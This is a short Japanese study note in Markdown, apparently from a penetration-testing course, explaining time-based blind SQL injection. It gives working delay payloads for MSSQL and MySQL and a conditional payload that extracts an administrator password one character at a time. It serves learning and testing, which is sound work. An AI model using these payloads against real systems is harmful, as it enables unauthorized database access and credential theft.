## Time-based SQLiとは

- [4-1. Boolean-based SQLi](4-1.%20Boolean-based%20SQLi.md)と[4-2. Error-based SQLi](4-2.%20Error-based%20SQLi.md)が機能しないときに考慮する攻撃
- 注入した条件の真偽に応じて遅延を起こす
- SQLクエリの実行を遅らせることでHTTPレスポンスも遅らせる。
- 注目するのはHTTPレスポンスの受信に要した時間。
- Repeaterの右下にレスポンスタイムが記載されている

## Time-based SQLi概要

- クエリの基本文法は[4-2. Error-based SQLi](4-2.%20Error-based%20SQLi.md)を参考に
- RDBごとの文法：[SQL cheet sheet Time delays & Conditional Time delays](https://portswigger.net/web-security/sql-injection/cheat-sheet#:~:text=a%20MySQL%20database.-,Time%20delays,-You%20can%20cause)
- 例：
```sql
-- MSSQL
http..?user=offsec' AND IF (1=2) WAITFOR DELAY '0:0:10'-- // 
user=offsec' IF (1=1) WAITFOR DELAY '0:0:10'-- //

-- MySQL
http..?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
- これらの入力のうち最初の入力は、条件が`1=2`でFALSEであるため、遅延を引き起こさない。  
- 2番目の入力は、条件`1=1`でTRUEであるため、10秒の遅延を引き起こす。
- 3番目の入力は、userが存在するのであれば、3秒の遅延を引き起こす。

- このテクニックを使えば、1文字ずつテストしてデータを取り出すことができる：
```sql
AND IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:[秒数]' -- //
```
（Passwordの1文字目が`m`より大きいのであれば、秒数分遅延
